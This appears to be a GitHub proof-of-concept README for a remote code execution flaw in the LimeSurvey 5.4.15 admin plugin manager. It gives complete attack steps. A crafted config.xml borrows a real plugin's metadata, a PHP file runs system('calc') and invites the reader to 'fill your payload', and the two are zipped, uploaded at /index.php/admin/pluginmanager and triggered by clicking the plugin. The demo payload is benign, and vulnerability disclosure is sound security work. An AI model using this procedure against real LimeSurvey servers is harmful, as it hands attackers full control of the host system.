# LimeSurvey-5.4.15-PluginUploadtoRCE
In LimeSurvey-5.4.15, it has a vulnerability in index.php/admin/pluginmanager which can lead to RCE

**Impact:**
Complete control of the system.

**The directory structure of the files we need is as follows:**

![image](https://user-images.githubusercontent.com/71068573/209111954-855ad10c-f1ed-4ac8-b566-38c0eea82455.png)

**Here are the attack steps:**

1. Create a config.xml as follows, and remember the **name->exp**:

```
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>exp</name>
        <type>plugin</type>
        <creationDate>2021-11-18</creationDate>
        <lastUpdate>2021-11-23</lastUpdate>
        <author>Denis Chenu (for Respondage)</author>
        <authorUrl>https://www.respondage.nl</authorUrl>
        <supportUrl>https://www.limesurvey.org</supportUrl>
        <version>0.2.1</version>
        <license>GNU General Public License version 3 or later</license>
        <description><![CDATA[Expression Script: make answer option text available; see settings for documentation and usage.]]></description>
    </metadata>

    <compatibility>
        <version>5.0</version>
    </compatibility>

    <updaters disabled="disabled">
    </updaters>
</config>
```

2. Create a php file with the same **name(exp)** exp.php and fill your payload, like the following example:

```
<?php
system('calc');
?>
```

3. Compress config.xml and exp.php into one compressed package like exp.zip:


4. Upload this exp.zip file in **/index.php/admin/pluginmanager?sa=index** :

![image](https://user-images.githubusercontent.com/71068573/209114125-96840b66-2f3c-40b4-a67f-0324c2fc544d.png)

5. Finally, when you click the plugin that uploaded, the php payload will be triggered:

![image](https://user-images.githubusercontent.com/71068573/209113806-1f5eb404-b375-4d86-91e5-75e188ba115d.png)

![image](https://user-images.githubusercontent.com/71068573/209114242-a7c5d46f-8aa6-44e7-bff3-a5524a36e5f2.png)

